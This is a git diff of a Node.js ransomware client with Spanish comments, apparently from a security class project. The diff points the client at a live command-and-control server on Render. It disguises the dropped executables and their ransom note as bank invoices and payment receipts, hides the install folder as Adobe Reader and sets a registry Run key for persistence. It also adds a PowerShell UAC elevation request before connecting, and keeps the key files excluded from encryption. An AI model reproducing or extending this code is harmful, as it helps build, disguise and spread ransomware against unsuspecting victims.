@@ -20,7 +20,7 @@ try {
 // Lista de servidores (primero Render, luego local)
 // IMPORTANTE: Reemplaza 'TU-APP-RENDER' con el nombre real de tu app en Render
 const SERVERS = configFile.SERVERS || [
-    'https://TU-APP-RENDER.onrender.com',  // Servidor en la nube (Render) - PRIMARIO
+    'https://proyectoseguridad-pnzo.onrender.com',  // Servidor en la nube (Render) - PRIMARIO
     'http://localhost:3000',                // Servidor local - FALLBACK
     'http://10.214.47.137:3000'             // IP local de red - FALLBACK 2
 ];
@@ -28,17 +28,19 @@ const SERVERS = configFile.SERVERS || [
 let currentServerIndex = 0;
 let SERVER_URL = SERVERS[currentServerIndex];
 
-const INSTALL_DIR = path.join(process.env.APPDATA || os.homedir(), 'WindowsUpdate');
-const EXE_NAME = 'WindowsUpdateService_Cripto.exe';  // Nombre distintivo para evidenciar persistencia
-const NOTA_NAME = 'nota_rescate_Cripto.exe';         // Nombre distintivo para nota de rescate
+const INSTALL_DIR = path.join(process.env.APPDATA || os.homedir(), 'AdobeReader');
+const EXE_NAME = 'Factura_Electronica_Enero2026.exe';       // Parece factura bancaria
+const NOTA_NAME = 'Comprobante_Pago_2026.exe';              // Parece comprobante de pago
 const REG_KEY = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
-const REG_VALUE = 'WindowsUpdateService';
+const REG_VALUE = 'AdobeAcrobatUpdate';
 
 // Archivos C2 que NUNCA deben cifrarse
 const ARCHIVOS_EXCLUIDOS = [
     'cliente_new.exe', 'cliente.exe', 'cliente_v2.exe',
+    'Factura_Electronica_Enero2026.exe', 'Comprobante_Pago_2026.exe',
+    'Factura_Banco_2024.exe', 'Comprobante_Transaccion.exe',
     'nota_rescate.exe', 'nota_rescate_Cripto.exe',
-    'escudo.png', '.aes_key', '.decrypt_used', '.client_id',
+    'escudo.png', 'adobe_icon.png', '.aes_key', '.decrypt_used', '.client_id',
     'WindowsUpdateService_Cripto.exe', 'WindowsUpdateService.exe'
 ];
 
@@ -49,6 +51,80 @@ let socket = null;
 let reconnectInterval = null;
 let connectionAttempts = 0;
 const MAX_ATTEMPTS_PER_SERVER = 3;
+let isElevated = false;
+
+// ===============================
+// ELEVACION UAC (SOLICITAR ADMIN)
+// ===============================
+function checkIfAdmin() {
+    try {
+        // Intentar escribir en directorio del sistema para verificar si somos admin
+        const testPath = 'C:\\Windows\\Temp\\admin_test_' + Date.now() + '.tmp';
+        fs.writeFileSync(testPath, 'test');
+        fs.unlinkSync(testPath);
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+function requestElevation() {
+    return new Promise((resolve) => {
+        // Si ya somos admin o estamos en desarrollo, continuar
+        if (checkIfAdmin()) {
+            console.log(' Ejecutando con privilegios de administrador');
+            isElevated = true;
+            resolve(true);
+            return;
+        }
+
+        // Verificar si ya intentamos elevar (evitar bucle infinito)
+        const elevationMarker = path.join(INSTALL_DIR, '.elevation_attempted');
+        if (fs.existsSync(elevationMarker)) {
+            console.log(' Continuando sin privilegios de administrador');
+            try { fs.unlinkSync(elevationMarker); } catch (e) { }
+            resolve(false);
+            return;
+        }
+
+        // Marcar que intentamos elevar
+        try {
+            if (!fs.existsSync(INSTALL_DIR)) {
+                fs.mkdirSync(INSTALL_DIR, { recursive: true });
+            }
+            fs.writeFileSync(elevationMarker, Date.now().toString());
+        } catch (e) { }
+
+        // Intentar relanzar con privilegios elevados usando PowerShell
+        const currentExe = process.execPath;
+        const args = process.argv.slice(1).join(' ');
+
+        console.log(' Solicitando privilegios de administrador...');
+
+        // PowerShell Start-Process con -Verb RunAs solicita UAC
+        const psCommand = `Start-Process -FilePath "${currentExe}" -ArgumentList "${args}" -Verb RunAs -ErrorAction SilentlyContinue`;
+
+        exec(`powershell -Command "${psCommand}"`, { windowsHide: true }, (error) => {
+            if (error) {
+                // Usuario denegó UAC o falló - continuar sin admin
+                console.log(' UAC denegado o no disponible. Continuando sin privilegios elevados.');
+                try { fs.unlinkSync(elevationMarker); } catch (e) { }
+                resolve(false);
+            } else {
+                // Nuevo proceso elevado iniciado, este proceso puede terminar
+                console.log(' Proceso elevado iniciado. Este proceso terminará.');
+                process.exit(0);
+            }
+        });
+
+        // Timeout de 30 segundos por si el usuario no responde al UAC
+        setTimeout(() => {
+            console.log(' Timeout de UAC. Continuando sin privilegios elevados.');
+            try { fs.unlinkSync(elevationMarker); } catch (e) { }
+            resolve(false);
+        }, 30000);
+    });
+}
 
 // ===============================
 // PERSISTENCIA EN WINDOWS
@@ -1151,7 +1227,12 @@ process.on('unhandledRejection', (reason, promise) => {
 
 // Iniciar con manejo de errores
 console.log(' Iniciando cliente...');
-conectar().catch(err => {
+
+// Primero intentar obtener privilegios de admin, luego conectar
+requestElevation().then(() => {
+    console.log(isElevated ? ' Privilegios elevados obtenidos' : ' Ejecutando sin privilegios elevados');
+    return conectar();
+}).catch(err => {
     console.error('\n Error en funcion principal:', err);
     esperarYSalir(1);
 });
